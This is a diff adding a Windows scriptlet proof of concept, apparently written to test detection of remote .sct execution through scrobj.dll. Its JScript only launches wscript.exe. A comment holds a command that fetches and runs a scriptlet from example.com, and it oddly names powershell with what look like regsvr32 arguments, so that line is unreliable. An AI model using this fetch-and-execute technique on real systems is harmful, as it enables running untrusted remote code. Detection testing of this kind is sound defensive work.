@@ -1,0 +1,22 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<!-- powershell /s /u /i:http://example.com/powershell.sct scrobj.dll -->
+
+	<!-- .sct files when downloaded, are executed from a path like this -->
+	<!-- File extension could be anything -->
+	<!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\testfile[2].sct -->
+	<!-- Based on current research, no registry keys are written, since call "uninstall" -->
+  	<!-- we can either execute locally, or from a url -->
+	<script language="JScript">
+		<![CDATA[
+	    		// wscript.exe should launch, this could be any arbitrary code.
+      	   		// What you are hoping to catch is the cmdline, modloads, or network connections, or any variation
+			var r = new ActiveXObject("WScript.Shell").Run("wscript.exe");	
+	
+		]]>
+</script>
+</registration>
+</scriptlet>
